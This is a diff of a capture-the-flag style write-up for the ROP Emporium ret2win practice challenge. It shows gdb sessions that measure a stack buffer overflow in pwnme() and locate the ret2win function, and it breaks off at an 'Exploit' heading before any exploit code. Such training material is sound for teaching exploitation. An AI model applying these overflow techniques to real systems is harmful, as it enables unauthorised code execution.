@@ -65,41 +65,19 @@ Let's exploit the buffer overflow in pwnme() to redirect the program towards ret
 Let's find out how many bytes we need to overwrite before accessing the return address :
 
 ```gdb
-gef➤  disas pwnme 
-Dump of assembler code for function pwnme:
-   0x00000000004006e8 <+0>:	push   rbp
-   0x00000000004006e9 <+1>:	mov    rbp,rsp
-   0x00000000004006ec <+4>:	sub    rsp,0x20
-   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
-   0x00000000004006f4 <+12>:	mov    edx,0x20
-   0x00000000004006f9 <+17>:	mov    esi,0x0
-   0x00000000004006fe <+22>:	mov    rdi,rax
-   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
-   0x0000000000400706 <+30>:	mov    edi,0x400838
-   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
-   0x0000000000400710 <+40>:	mov    edi,0x400898
-   0x0000000000400715 <+45>:	call   0x400550 <puts@plt>
-   0x000000000040071a <+50>:	mov    edi,0x4008b8
-   0x000000000040071f <+55>:	call   0x400550 <puts@plt>
-   0x0000000000400724 <+60>:	mov    edi,0x400918
-   0x0000000000400729 <+65>:	mov    eax,0x0
-   0x000000000040072e <+70>:	call   0x400570 <printf@plt>
-   0x0000000000400733 <+75>:	lea    rax,[rbp-0x20]
-   0x0000000000400737 <+79>:	mov    edx,0x38
-   0x000000000040073c <+84>:	mov    rsi,rax
-   0x000000000040073f <+87>:	mov    edi,0x0
-   0x0000000000400744 <+92>:	call   0x400590 <read@plt>
-   0x0000000000400749 <+97>:	mov    edi,0x40091b
-   0x000000000040074e <+102>:	call   0x400550 <puts@plt>
-   0x0000000000400753 <+107>:	nop
-   0x0000000000400754 <+108>:	leave
-   0x0000000000400755 <+109>:	ret
-End of assembler dump.
-gef➤  break *pwnme+97
-Breakpoint 1 at 0x400749
-gef➤  break *pwnme+109
-Breakpoint 2 at 0x400755
-gef➤  r <<< $(python3 -c 'print("\x41"*32)')
+gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
+Starting program: /home/coucou/Documents/ROP_Emporium/01_ret2win/ret2win <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> 
+Breakpoint 1, 0x0000000000400749 in pwnme ()
 
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
@@ -147,54 +125,18 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 [#0] 0x400749 → pwnme()
 [#1] 0x4006d7 → main()
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  c
-
-[ Legend: Modified register | Code | Heap | Stack | String ]
-─────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0xb               
-$rbx   : 0x00007fffffffdb68  →  0x00007fffffffdf4b  →  "/home/coucou/Documents/ROP_Emporium/01_ret2win/ret[...]"
-$rcx   : 0x00007ffff7ec1b00  →  0x5877fffff0003d48 ("H="?)
-$rdx   : 0x0               
-$rsp   : 0x00007fffffffda48  →  0x00000000004006d7  →  <main+0040> mov edi, 0x400828
-$rbp   : 0x00007fffffffda0a  →  0x000000007fffffff
-$rsi   : 0x00007ffff7f9e803  →  0xf9fa30000000000a ("\n"?)
-$rdi   : 0x00007ffff7f9fa30  →  0x0000000000000000
-$rip   : 0x0000000000400755  →  <pwnme+006d> ret 
-$r8    : 0x00000000004007f0  →  <__libc_csu_fini+0000> repz ret
-$r9    : 0x00007ffff7fcfb10  →  <_dl_fini+0000> push r15
-$r10   : 0x00007ffff7dd9b08  →  0x0010001200001a3f
-$r11   : 0x202             
-$r12   : 0x0               
-$r13   : 0x00007fffffffdb78  →  0x00007fffffffdf82  →  "INVOCATION_ID=462553133eb249a98e1baff58ccd460e"
-$r14   : 0x0               
-$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
-$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
-─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffda48│+0x0000: 0x00000000004006d7  →  <main+0040> mov edi, 0x400828	 ← $rsp
-0x00007fffffffda50│+0x0008: 0x0000000000000001
-0x00007fffffffda58│+0x0010: 0x00007ffff7df16ca  →  <__libc_start_call_main+007a> mov edi, eax
-0x00007fffffffda60│+0x0018: 0x0000000000000000
-0x00007fffffffda68│+0x0020: 0x0000000000400697  →  <main+0000> push rbp
-0x00007fffffffda70│+0x0028: 0x0000000100000000
-0x00007fffffffda78│+0x0030: 0x00007fffffffdb68  →  0x00007fffffffdf4b  →  "/home/coucou/Documents/ROP_Emporium/01_ret2win/ret[...]"
-0x00007fffffffda80│+0x0038: 0x00007fffffffdb68  →  0x00007fffffffdf4b  →  "/home/coucou/Documents/ROP_Emporium/01_ret2win/ret[...]"
-───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-     0x40074e <pwnme+0066>     call   0x400550 <puts@plt>
-     0x400753 <pwnme+006b>     nop    
-     0x400754 <pwnme+006c>     leave  
- →   0x400755 <pwnme+006d>     ret    
-   ↳    0x4006d7 <main+0040>      mov    edi, 0x400828
-        0x4006dc <main+0045>      call   0x400550 <puts@plt>
-        0x4006e1 <main+004a>      mov    eax, 0x0
-        0x4006e6 <main+004f>      pop    rbp
-        0x4006e7 <main+0050>      ret    
-        0x4006e8 <pwnme+0000>     push   rbp
-───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "ret2win", stopped 0x400755 in pwnme (), reason: BREAKPOINT
-─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x400755 → pwnme()
-[#1] 0x4006d7 → main()
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤ 
 ```
+
+We can see that the rbp is stored right after the variable. All we need now is to find out the address we want to return to :
+
+```gdb
+gef➤  i func ret2win
+All functions matching regular expression "ret2win":
+
+Non-debugging symbols:
+0x0000000000400756  ret2win
+```
+
+Let's write the exploit.
+
+# Exploit
